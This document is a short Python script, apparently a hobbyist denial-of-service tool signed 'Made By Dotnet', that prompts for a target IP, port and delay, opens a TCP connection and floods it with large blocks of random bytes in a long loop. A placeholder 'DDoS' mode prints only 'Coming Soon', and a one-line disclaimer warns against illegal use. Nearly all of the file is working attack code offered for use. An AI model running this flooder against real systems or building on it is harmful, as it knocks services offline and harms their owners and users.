import sys
import random
import time
import os
import socket
from colorama import Fore
import errno

def dos():
    try:

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            target = input("target IP: ")
            port = int(input("target PORT: "))
            sleep = float(input("sleap TIME: "))

            s.connect((target, port))

            for i in range(1, 100*10000):

                s.send(random._urandom(10)*10000)
                print(f"Sent {i} packets", end='\r')

                time.sleep(sleep)

        except IOError as e:
            if e.errno == errno.EPIPE:
                pass
    except KeyboardInterrupt:
        exit()

def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.025)

title = Fore.CYAN + """"""

def banner():
    delay_print("Made By Dotnet\n")
    delay_print("Don't use for illegal porpouse\n")

def ddos():
    os.system("clear")
    delay_print(Fore.RED + "Coming Soon")


def main():
    banner()

    #print("Wrong Usage")
    #print("Use -h to show the help panel")
    
    if sys.argv[1] == "-h" or sys.argv[1] == "--help":
        os.system("clear")

        banner()

        print("Use -d or --dos for the DoS Pannel")

        print("Use -ds or --ddos for the DDoS Pannel")

    elif sys.argv[1] == "-d" or sys.argv[1] == "--dos":

        os.system("clear")

        banner()

        dos()

    elif sys.argv[1] == "-ds" or sys.argv[1] == "--ddos":
        os.system("clear")

        banner()

        ddos()

    else:
        print(Fore.RED + "Incorrect Usage")

if __name__ == "__main__":
    main()
